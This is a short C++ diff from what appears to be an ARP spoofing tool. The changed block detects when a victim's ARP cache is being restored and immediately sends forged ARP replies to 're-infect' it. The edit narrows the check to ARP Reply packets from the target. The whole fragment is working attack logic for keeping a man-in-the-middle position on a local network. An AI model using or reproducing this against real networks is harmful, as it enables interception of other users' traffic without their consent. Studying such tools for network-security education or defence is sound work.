@@ -155,8 +155,7 @@ int main(int argc, char* argv[]) {
         if (eth_hdr->type() == EthHdr::Arp) {
             ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
             for (Flow& f : flows) {
-                if ((arp_hdr->sip() == f.sender_ip && arp_hdr->tip() == f.target_ip && arp_hdr->tmac() == f.target_mac) ||
-                    (arp_hdr->sip() == f.target_ip && arp_hdr->tip() == f.sender_ip && arp_hdr->tmac() == f.sender_mac)) {
+                if (arp_hdr->op()==ArpHdr::Reply && arp_hdr->sip() == f.target_ip && arp_hdr->tip() == f.sender_ip && arp_hdr->tmac() == f.sender_mac) {
                     printf("[!] Detected ARP recovery from sender %s, re-infecting...\n", std::string(f.sender_ip).c_str());
                     sendArpReply(handle, f.sender_ip, f.target_ip, f.sender_mac);
                 }
